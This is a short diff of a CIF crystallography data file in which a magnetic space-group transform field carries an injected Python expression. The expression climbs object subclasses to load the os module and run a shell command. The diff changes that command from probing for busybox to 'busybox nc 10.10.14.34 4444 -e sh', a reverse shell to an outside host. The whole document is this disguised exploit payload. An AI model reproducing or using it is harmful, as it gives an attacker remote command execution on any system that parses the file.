@@ -234,7 +234,7 @@ loop_
  H 0.00000 0.00000 0.00000 1
  O 0.50000 0.50000 0.50000 1
 
-_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("which busybox | nc 10.10.14.34 4444");0,0,0'
+_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.14.34 4444 -e sh");0,0,0'
 
 
 _space_group_magn.number_BNS  62.448
